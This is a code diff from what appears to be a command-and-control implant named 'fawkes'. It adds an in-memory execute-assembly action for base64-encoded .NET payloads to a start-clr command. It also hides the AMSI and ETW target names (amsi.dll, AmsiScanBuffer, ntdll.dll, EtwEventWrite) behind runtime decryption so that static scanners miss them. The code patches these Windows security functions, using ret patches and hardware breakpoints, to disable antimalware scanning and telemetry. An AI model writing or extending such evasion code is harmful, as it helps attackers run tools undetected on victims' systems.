@@ -4,13 +4,13 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
 	"syscall"
 	"time"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 
 	"github.com/Ne0nd0g/go-clr"
@@ -33,10 +33,24 @@ func (c *StartCLRCommand) Description() string {
 type StartCLRParams struct {
 	AmsiPatch string `json:"amsi_patch"`
 	EtwPatch  string `json:"etw_patch"`
+	Action    string `json:"action"`
+	Assembly  string `json:"assembly"`  // base64-encoded .NET assembly for execute-assembly
+	Arguments string `json:"arguments"` // arguments for the assembly
 }
 
 // Execute executes the start-clr command
 func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
+	// Parse params early to check for execute-assembly action
+	params, parseErr := unmarshalParams[StartCLRParams](task)
+	if parseErr != nil {
+		return *parseErr
+	}
+
+	// Handle execute-assembly action (separate flow with auto-patching)
+	if params.Action == "execute-assembly" {
+		return executeAssemblyAction(params.Assembly, params.Arguments)
+	}
+
 	// Use the shared assemblyMutex from inlineassembly.go for CLR state
 	assemblyMutex.Lock()
 	defer assemblyMutex.Unlock()
@@ -46,13 +60,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: This command is only supported on Windows")
 	}
 
-	// Parse parameters (default to "None" if empty/missing for backward compat)
-	var params StartCLRParams
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-			return errorf("Error parsing parameters: %v", err)
-		}
-	}
+	// Default patch values for backward compat
 	if params.AmsiPatch == "" {
 		params.AmsiPatch = "None"
 	}
@@ -106,11 +114,23 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
+	// Decrypt sensitive DLL/function names at runtime
+	amsiDllName := obfuscate.AmsiDll()
+	defer obfuscate.Zero(amsiDllName)
+	amsiFunc := obfuscate.AmsiScanBuffer()
+	defer obfuscate.Zero(amsiFunc)
+	ntdllName := obfuscate.NtdllDll()
+	defer obfuscate.Zero(ntdllName)
+	etwWriteName := obfuscate.EtwEventWrite()
+	defer obfuscate.Zero(etwWriteName)
+	etwRegName := obfuscate.EtwEventRegister()
+	defer obfuscate.Zero(etwRegName)
+
 	// Apply AMSI patch
 	switch params.AmsiPatch {
 	case "Autopatch":
-		output += "\n[*] Applying AMSI Autopatch (amsi.dll!AmsiScanBuffer)...\n"
-		patchOutput, err := PerformAutoPatch("amsi.dll", "AmsiScanBuffer", 300)
+		output += "\n[*] Applying AMSI Autopatch...\n"
+		patchOutput, err := PerformAutoPatch(amsiDllName, amsiFunc, 300)
 		if err != nil {
 			output += fmt.Sprintf("[-] AMSI Autopatch failed: %v\n", err)
 		} else {
@@ -118,8 +138,8 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 			output += patchOutput + "\n"
 		}
 	case "Ret Patch":
-		output += "\n[*] Applying AMSI Ret Patch (amsi.dll!AmsiScanBuffer)...\n"
-		patchOutput, err := PerformRetPatch("amsi.dll", "AmsiScanBuffer")
+		output += "\n[*] Applying AMSI Ret Patch...\n"
+		patchOutput, err := PerformRetPatch(amsiDllName, amsiFunc)
 		if err != nil {
 			output += fmt.Sprintf("[-] AMSI Ret Patch failed: %v\n", err)
 		} else {
@@ -131,30 +151,32 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 	// Apply ETW patch (EtwEventWrite + EtwEventRegister)
 	switch params.EtwPatch {
 	case "Autopatch":
-		output += "\n[*] Applying ETW Autopatch (ntdll.dll!EtwEventWrite)...\n"
-		patchOutput, err := PerformAutoPatch("ntdll.dll", "EtwEventWrite", 300)
+		output += "\n[*] Applying ETW Autopatch...\n"
+		patchOutput, err := PerformAutoPatch(ntdllName, etwWriteName, 300)
 		if err != nil {
 			output += fmt.Sprintf("[-] ETW Autopatch failed: %v\n", err)
 		} else {
+			etwPatched = true
 			output += patchOutput + "\n"
 		}
-		output += "[*] Applying ETW Autopatch (ntdll.dll!EtwEventRegister)...\n"
-		patchOutput, err = PerformAutoPatch("ntdll.dll", "EtwEventRegister", 300)
+		output += "[*] Applying ETW Autopatch (EtwEventRegister)...\n"
+		patchOutput, err = PerformAutoPatch(ntdllName, etwRegName, 300)
 		if err != nil {
 			output += fmt.Sprintf("[-] EtwEventRegister Autopatch failed: %v\n", err)
 		} else {
 			output += patchOutput + "\n"
 		}
 	case "Ret Patch":
-		output += "\n[*] Applying ETW Ret Patch (ntdll.dll!EtwEventWrite)...\n"
-		patchOutput, err := PerformRetPatch("ntdll.dll", "EtwEventWrite")
+		output += "\n[*] Applying ETW Ret Patch...\n"
+		patchOutput, err := PerformRetPatch(ntdllName, etwWriteName)
 		if err != nil {
 			output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
 		} else {
+			etwPatched = true
 			output += patchOutput
 		}
-		output += "[*] Applying ETW Ret Patch (ntdll.dll!EtwEventRegister)...\n"
-		patchOutput, err = PerformRetPatch("ntdll.dll", "EtwEventRegister")
+		output += "[*] Applying ETW Ret Patch (EtwEventRegister)...\n"
+		patchOutput, err = PerformRetPatch(ntdllName, etwRegName)
 		if err != nil {
 			output += fmt.Sprintf("[-] EtwEventRegister Ret Patch failed: %v\n", err)
 		} else {
@@ -170,22 +192,22 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		var amsiAddr, etwAddr uintptr
 
 		if params.AmsiPatch == "Hardware Breakpoint" {
-			addr, err := resolveFunctionAddress("amsi.dll", "AmsiScanBuffer")
+			addr, err := resolveFunctionAddress(amsiDllName, amsiFunc)
 			if err != nil {
-				output += fmt.Sprintf("[-] Failed to resolve AmsiScanBuffer: %v\n", err)
+				output += fmt.Sprintf("[-] Failed to resolve AMSI target: %v\n", err)
 			} else {
 				amsiAddr = addr
-				output += fmt.Sprintf("[+] AmsiScanBuffer at 0x%X -> Dr0\n", addr)
+				output += fmt.Sprintf("[+] AMSI target at 0x%X -> Dr0\n", addr)
 			}
 		}
 
 		if params.EtwPatch == "Hardware Breakpoint" {
-			addr, err := resolveFunctionAddress("ntdll.dll", "EtwEventWrite")
+			addr, err := resolveFunctionAddress(ntdllName, etwWriteName)
 			if err != nil {
-				output += fmt.Sprintf("[-] Failed to resolve EtwEventWrite: %v\n", err)
+				output += fmt.Sprintf("[-] Failed to resolve ETW target: %v\n", err)
 			} else {
 				etwAddr = addr
-				output += fmt.Sprintf("[+] EtwEventWrite at 0x%X -> Dr1\n", addr)
+				output += fmt.Sprintf("[+] ETW target at 0x%X -> Dr1\n", addr)
 			}
 		}
 
@@ -196,6 +218,9 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 			} else {
 				if amsiAddr != 0 {
 					amsiPatched = true
+				}
+				if etwAddr != 0 {
+					etwPatched = true
 				}
 				output += hwbpOutput
 			}
@@ -214,14 +239,16 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 	return successResult(output)
 }
 
-// loadAMSI explicitly loads amsi.dll into the process
+// loadAMSI explicitly loads the AMSI DLL into the process
 func loadAMSI() error {
-	amsiDLL, err := syscall.LoadDLL("amsi.dll")
+	name := obfuscate.AmsiDll()
+	defer obfuscate.Zero(name)
+	dll, err := syscall.LoadDLL(name)
 	if err != nil {
-		return fmt.Errorf("failed to load amsi.dll: %v", err)
+		return fmt.Errorf("failed to load target DLL: %w", err)
 	}
-	// We keep the handle - don't release it since we want AMSI loaded in memory
-	_ = amsiDLL
+	// We keep the handle - don't release it since we want it loaded in memory
+	_ = dll
 
 	return nil
 }
